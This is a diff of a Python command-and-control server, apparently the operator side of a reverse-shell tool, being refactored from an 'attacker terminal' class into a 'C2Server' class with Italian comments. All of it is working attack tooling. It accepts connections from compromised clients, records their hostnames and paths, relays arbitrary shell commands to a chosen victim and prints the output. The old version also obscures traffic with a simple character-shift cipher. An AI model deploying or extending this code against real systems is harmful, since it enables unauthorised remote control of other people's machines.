@@ -1,180 +1,157 @@
 import os
 import socket
+import threading
 from datetime import datetime
-from threading import Thread
-from time import sleep
+from pathlib import Path
+
+class ClientHandler:
+    """Gestisce la singola connessione con un client."""
+    def __init__(self, connection, address):
+        self.conn = connection
+        self.addr = address
+        self.hostname = ""
+        self.current_path = ""
+
+    def send(self, data):
+        self.conn.send(data.encode('utf-8'))
+
+    def receive(self, buffer_size=4096):
+        return self.conn.recv(buffer_size).decode('utf-8', errors="replace")
+
+    def close(self):
+        self.conn.close()
 
 
-def log(stringa):
-    """
-    log function
-    """
-    if not os.path.isdir("../log"): os.mkdir("../log")
-    with open(f"../log/{os.path.basename(__file__).split('.')[0]}.log", "a") as flog:
-        flog.write(stringa + "\n")
-    return
+class C2Server:
+    """Il nucleo del Server Command & Control."""
+    def __init__(self, host='0.0.0.0', port=8081, max_conns=5):
+        self.host = host
+        self.port = port
+        self.max_connections = max_conns
+        
+        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.clients = {}  # {id: ClientHandler}
+        self.client_id_counter = 0
+        self.selected_id = None
+        
+        # Lock per gestire l'accesso alla lista clients da più thread in sicurezza
+        self.lock = threading.Lock()
+        
+        self.setup_directories()
 
+    def setup_directories(self):
+        """Crea le cartelle necessarie usando pathlib."""
+        Path("../log").mkdir(exist_ok=True)
+        Path("../conf").mkdir(exist_ok=True)
 
-def encrypt(string):
-    enstring = ""
-    for char in string:
-        enstring += chr(ord(char) + 25)
-    return enstring
+    def log(self, message):
+        """Scrive i log su file."""
+        log_path = Path(f"../log/server.log")
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        with open(log_path, "a") as f:
+            f.write(f"[{timestamp}] {message}\n")
 
+    def start(self):
+        """Avvia il server e il thread di ascolto."""
+        try:
+            self.server_socket.bind((self.host, self.port))
+            self.server_socket.listen(self.max_connections)
+            
+            # Thread per accettare nuove connessioni
+            threading.Thread(target=self.accept_loop, daemon=True).start()
+            
+            print(f"[*] Server avviato su {self.host}:{self.port}")
+            self.log("Server Started")
+            self.terminal()
+        except Exception as e:
+            print(f"[!] Errore avvio server: {e}")
 
-def decrypt(enstring):
-    string = ""
-    for char in enstring:
-        string += chr(ord(char) - 25)
-    return string
-
-
-class StartServer:
-    """
-    the server heart
-    """
-    def __init__(self):
-        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-        if os.path.exists("../conf/configuration.txt"): # search for configuration file
-            with open("../conf/configuration.txt") as fconf:
-                self.host = fconf.readline().strip().split("-")[1] # read it
-                self.port = int(fconf.readline().strip().split("-")[1])
-                self.max_connections = int(fconf.readline().strip().split("-")[1]) # max connection
-
-                print("I found the configuration file!\n"  # default params
-                      "Default parameters set:\n"
-                      f"    -   host: {self.host}\n"
-                      f"    -   port: {self.port}\n"
-                      f"    -   maxc: {self.max_connections}")
-
-        else:
-            self.host = ""  # use only one interface for security
-            self.port = 8081
-            self.max_connections = 5
-
-            print("Seems like configuration file doesn't exists\nDefault parameters set:\n"
-                  "    -   host: None\n    -   port: 8081\n    -   maxc: 5\n")
-
-            if not os.path.isdir("../conf"): os.mkdir("../conf")
-            with open("../conf/configuration.txt", "w") as nfconf:
-                nfconf.write("host-None\nport-8081\nmaxc-5")
-
-        self.server.bind((self.host, self.port))  # server binding
-        self.server.listen(self.max_connections)  # first listen
-        Thread(target=self.accept_connections).start()  # start the listener thread
-        log("-" * 45 + f"""\n\nServer Started
-{datetime.today().strftime('%d/%m/%Y - %H:%M:%S')}
-Ip: {self.host}@{self.port}\n""" + "-" * 45)
-        print(
-            "Server Started\n"
-            f"Ip: {self.host}@{self.port}\n"
-            "Listening For Client Connection ...")
-
-        # default vars
-        self.clients_list = {}
-        self.counter = 0
-        self.terminal = 1
-        self.main()
-
-    def main(self):
+    def accept_loop(self):
+        """Ciclo continuo per accettare client."""
         while True:
-            try:
-                self.start_terminal()
-            except ConnectionError as e:
-                log(f'\n{self.clients_list[self.terminal][1]} Interrupted\n{e}\n')
-                print(
-                    f"\n{self.clients_list[self.terminal][1]} Interrupted\n{e}\n")
-                self.counter -= 1  # count downed
-                del self.clients_list[self.terminal]  # client deleted from list
-                if not self.counter:
-                    print("\nNone clients remains\nListening for new connections...")
-                    self.terminal = 1
+            conn, addr = self.server_socket.accept()
+            
+            with self.lock:
+                if len(self.clients) < self.max_connections:
+                    self.client_id_counter += 1
+                    new_client = ClientHandler(conn, addr)
+                    
+                    # Ricezione handshake iniziale (es. hostname e path)
+                    try:
+                        data = new_client.receive().strip()
+                        # Formato atteso dal client: "Path#Hostname"
+                        if "#" in data:
+                            new_client.current_path, new_client.hostname = data.split("#")
+                        
+                        self.clients[self.client_id_counter] = new_client
+                        print(f"\n[+] Nuovo client connesso: {addr} (ID: {self.client_id_counter})")
+                        self.log(f"Connected: {addr}")
+                    except Exception as e:
+                        print(f"[!] Errore handshake: {e}")
+                        conn.close()
                 else:
-                    for cid in self.clients_list:
-                        self.terminal = cid
-                        break
-                continue
+                    conn.close()
 
-    def accept_connections(self):
+    def list_clients(self):
+        """Mostra la lista dei client connessi."""
+        print("\nID\tIndirizzo\t\tHostname")
+        print("-" * 45)
+        with self.lock:
+            for cid, c in self.clients.items():
+                print(f"{cid}\t{c.addr[0]}:{c.addr[1]}\t{c.hostname}")
+        print("-" * 45)
+
+    def terminal(self):
+        """Interfaccia di comando principale."""
         while True:
-            client, client_addr = self.server.accept()  # wait for requests
-            log(f'{client_addr} Request')
-            if client and (self.counter < self.max_connections):  # if there is space accept it
-                self.counter += 1
+            if not self.selected_id:
+                cmd = input("\nC2-Server > ").strip().lower()
+            else:
+                target = self.clients[self.selected_id]
+                cmd = input(f"[{self.selected_id}] {target.hostname}@{target.current_path} > ").strip()
 
-                self.clients_list[self.counter] = [  # clients list upgraded
-                    client,
-                    client_addr,
-                    decrypt(client.recv(1024).decode(errors="replace"))
-                ]
-                self.clients_list[self.counter].append(self.clients_list[self.counter][2].split("\\")[2])
-
-                log(f'\n{client_addr} Connected')
-                print(f'\n{self.clients_list[self.counter][1]} Client connected to the server')
-            elif self.counter >= self.max_connections:
-                log(f'\n{client_addr} Refused')
-                print(f'\nMax connections allowed ({self.max_connections}) reached.')
-                client.close()
-            sleep(0.5)
-
-    def start_terminal(self):
-
-        while True:
-            """
-            attacker terminal +
-            command for clients
-            """
-            sleep(0.1)
-            if self.counter:
-                command = input(
-                    f'{self.clients_list[self.terminal][1][0]}@{self.clients_list[self.terminal][1][1]} # {self.clients_list[self.terminal][2]}> ')
-
-                if command in ['?', 'help']:
-                    print("cchange+cid\tchange client on terminal\n"
-                          "cclients\tshow clients list\n"
-                          "cclose\tclose current session")
-                elif 'cchange ' in command:
-                    for client_id in self.clients_list:
-                        if str(client_id) == command.split(' ')[1]:
-                            self.terminal = client_id
-                elif 'cclients' in command:
-                    print(f" client \t    address&port    \t       alias\n"
-                          f"--------\t--------------------\t-------------------")
-                    for client_id in self.clients_list:
-                        print(f"   {client_id}    \t"
-                              f" {self.clients_list[client_id][1][0]}@{self.clients_list[client_id][1][1]}  \t"
-                              f" {self.clients_list[client_id][3]}")
-                elif 'cclose' in command:
-                    self.clients_list[self.terminal][0].send(encrypt("cclose").encode())
-                    log(f'\n{self.clients_list[self.terminal][1]} Connection closed')
-                    print(
-                        f"\n{self.clients_list[self.terminal][1]} Connection closed\n")
-                    del self.clients_list[self.terminal]
-                    self.counter -= 1
-                    if not self.counter:
-                        print("\nNone clients remains\nListening for new connections...")
-                        self.terminal = 1
+            if cmd in ['exit', 'quit']:
+                break
+            elif cmd == 'list':
+                self.list_clients()
+            elif cmd.startswith('select '):
+                try:
+                    cid = int(cmd.split(' ')[1])
+                    if cid in self.clients:
+                        self.selected_id = cid
                     else:
-                        # Returns true if the request was successful.
-                        for cid in self.clients_list:
-                            self.terminal = cid
-                elif command == '':
-                    self.clients_list[self.terminal][0].send(encrypt('.').encode())
-                else:
-                    self.clients_list[self.terminal][0].send(encrypt(command).encode())
-                    output = decrypt(self.clients_list[self.terminal][0].recv(4096).decode(errors="replace"))
-                    while "#path#" not in output:
-                        output += decrypt(self.clients_list[self.terminal][0].recv(4096).decode(errors="replace"))
-                    output, self.clients_list[self.terminal][2] = output.strip().split("#path#")
-                    if output != '.': print(output)
+                        print("[!] ID non valido.")
+                except: print("[!] Uso: select <id>")
+            elif cmd == 'back':
+                self.selected_id = None
+            elif self.selected_id:
+                self.send_command(cmd)
 
+    def send_command(self, cmd):
+        """Invia comando al client selezionato e gestisce la risposta."""
+        target = self.clients[self.selected_id]
+        try:
+            target.send(cmd)
+            if cmd == 'cclose':
+                with self.lock:
+                    del self.clients[self.selected_id]
+                self.selected_id = None
+                return
 
-def main():
-    StartServer()
-    return
-
+            # Ricezione output (gestione semplificata per esempio)
+            response = target.receive()
+            if "#path#" in response:
+                output, path = response.split("#path#")
+                target.current_path = path
+                print(output)
+            else:
+                print(response)
+        except Exception as e:
+            print(f"[!] Connessione persa con ID {self.selected_id}: {e}")
+            with self.lock:
+                del self.clients[self.selected_id]
+            self.selected_id = None
 
 if __name__ == "__main__":
-
-    main()
+    server = C2Server()
+    server.start()
